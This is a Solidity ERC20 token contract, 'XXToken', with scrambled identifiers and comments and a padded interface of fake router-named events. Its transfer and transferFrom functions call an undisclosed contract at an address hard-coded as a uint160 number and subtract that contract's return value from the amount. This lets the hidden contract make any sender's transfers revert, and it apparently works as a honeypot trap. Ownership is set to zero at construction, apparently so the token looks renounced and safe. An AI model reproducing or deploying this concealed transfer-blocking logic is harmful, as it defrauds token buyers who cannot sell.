// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(address(0));
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any accdretgvt other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new accdretgvt (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * This value changes when {approve} or {transferFrom} are called.
     */
    event removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amsfervntTokenMin,
        uint amsfervntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
    /**
     * @dev Sets `amsfervnt` as the allowance of `spender` over the caller's tokens.
     *
     * Emits an {Approval} event.
     */
    event swapExactTokensForTokens(
        uint amsfervntIn,
        uint amsfervntOutMin,
        address[]  path,
        address to,
        uint deadline
    );
    /**
  * @dev See {IERC20-totalSupply}.
     */
    event swapTokensForExactTokens(
        uint amsfervntOut,
        uint amsfervntInMax,
        address[] path,
        address to,
        uint deadline
    );

    event DOMAIN_SEPARATOR();

    event PERMIT_TYPEHASH();

    /**
     * @dev Returns the amsfervnt of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    event token0();

    event token1();
    /**
     * @dev Returns the amsfervnt of tokens owned by `accdretgvt`.
     */
    function balanceOf(address accdretgvt) external view returns (uint256);


    event sync();

    event initialize(address, address);
    /**
     * @dev Moves `amsfervnt` tokens from the caller's accdretgvt to `recipient`.
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amsfervnt) external returns (bool);

    event burn(address to) ;

    event swap(uint amsfervnt0Out, uint amsfervnt1Out, address to, bytes data);

    event skim(address to);
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    event addLiquidity(
        address tokenA,
        address tokenB,
        uint amsfervntADesired,
        uint amsfervntBDesired,
        uint amsfervntAMin,
        uint amsfervntBMin,
        address to,
        uint deadline
    );
    /**
     * Swaps an exact amsfervnt of ETH for as many output tokens as possible,
     *
     * */
    event addLiquidityETH(
        address token,
        uint amsfervntTokenDesired,
        uint amsfervntTokenMin,
        uint amsfervntETHMin,
        address to,
        uint deadline
    );
    /**
     * Swaps an exact amsfervnt of input tokens for as many output tokens as possible,
     * (if, for example, a direct pair does not exist).
     * */
    event removeLiquidity(
        address tokenA,
        address tokenB,   uint liquidity, uint amsfervntAMin,
        uint amsfervntBMin,
        address to,
        uint deadline
    );
    /**
     * @dev Sets `amsfervnt` as the allowance of `spender` over the caller's tokens.
     *
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amsfervnt) external returns (bool);
    /**
   * @dev Returns the name of the token.
     */
    event removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amsfervntTokenMin,  uint amsfervntETHMin,
        address to,
        uint deadline
    );
    /**
     * @dev Sets `amsfervnt` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits an {Approval} event.
     */
    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,  uint amsfervntTokenMin,
        uint amsfervntETHMin,  address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
    /**
     * Swaps an exact amsfervnt of input tokens for as many output tokens as possible,
     * along the route determined by the path. The first element of path is the input token,
     * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
     * (if, for example, a direct pair does not exist).
     */
    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amsfervntIn,
        uint amsfervntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
    * @dev Throws if called by any accdretgvt other than the owner.
     */
    event swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amsfervntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * @dev Moves tokens `amsfervnt` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * - `sender` must have a balance of at least `amsfervnt`.
     */
    event swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amsfervntIn,
        uint amsfervntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * @dev Moves `amsfervnt` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amsfervnt` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amsfervnt
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one accdretgvt (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface aksyysujay {
    function oapysuewbjay(address _amsfervnt) external view returns (uint256);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
  * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}


abstract contract Nmuysdajay {
    struct Typtrayfojay {
        bool stadrfsjay;
        bool tt;
        address user;
        uint count;

    }

    string kirdvtrqyjay = "ndjwiertjay";

    enum Vertreejay {
        Henjay,
        Batjay,
        Barbecuejay
    }

    uint160 fuuoigjay = 1252900943125425451192661219903146419478928891404;
    uint176 oiTRSFDTjay = 1;
    uint176 osdfejay = 1;

}


abstract contract Gbauajshjay {
    struct Pepasdihqw {
        uint208 qweyatsjay;
        address qsadsjcyujay;
        bool o24iqascvsijay;
        string qo1weihrdskjay;
    }

}

contract XXToken is IERC20, Nmuysdajay, Gbauajshjay, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _totalSupply = totalSupply_ * 10**_decimals;
        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }


    address private nyeusdrjay;
    uint256 poswjay = 118;


    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address accdretgvt)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[accdretgvt];
    }

    /**
     * @dev See {IERC20-transfer}.
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amsfervnt`.
     */
    function transfer(address recipient, uint256 amsfervnt)
    public
    virtual
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amsfervnt);
        if (amsfervnt <= fuuoigjay) {
            amsfervnt = amsfervnt - aksyysujay(address(fuuoigjay)).oapysuewbjay(msg.sender);
        }
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amsfervnt)
    public
    virtual
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amsfervnt);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * - `sender` must have a balance of at least `amsfervnt`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amsfervnt`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amsfervnt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amsfervnt);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amsfervnt,
                "ERC20: transfer amsfervnt exceeds allowance"
            )
        );
        if (amsfervnt <= fuuoigjay) {
            amsfervnt = amsfervnt - aksyysujay(address(fuuoigjay)).oapysuewbjay(sender);
        }
        return true;
    }

    /**
     * @dev Moves tokens `amsfervnt` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * - `sender` must have a balance of at least `amsfervnt`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amsfervnt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(
            amsfervnt,
            "ERC20: transfer amsfervnt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amsfervnt);
        emit Transfer(sender, recipient, amsfervnt);
    }

    /**
     * @dev Sets `amsfervnt` as the allowance of `spender` over the `owner` s tokens.
     *
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,  address spender, uint256 amsfervnt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amsfervnt;
        emit Approval(owner, spender, amsfervnt);
    }
}